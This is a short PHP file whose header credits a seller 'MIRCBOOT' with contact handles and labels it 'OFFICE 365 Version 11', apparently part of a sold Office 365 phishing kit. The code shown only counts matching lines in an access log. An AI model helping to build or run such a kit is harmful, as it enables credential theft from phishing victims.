<?php
// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// OFFICE 365 Version 11
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

$config        = array();
$config['key'] = 'Mircboot';

function getLog($pattern) {
    $i = 0;
    $get = file_get_contents('../logs/access.log');
    
    foreach(array_unique(explode("\n", $get)) as $data) {
        if(preg_match("/\[$pattern\]/i", $data)) {
            $i++;
        }
    }

    return $i;
}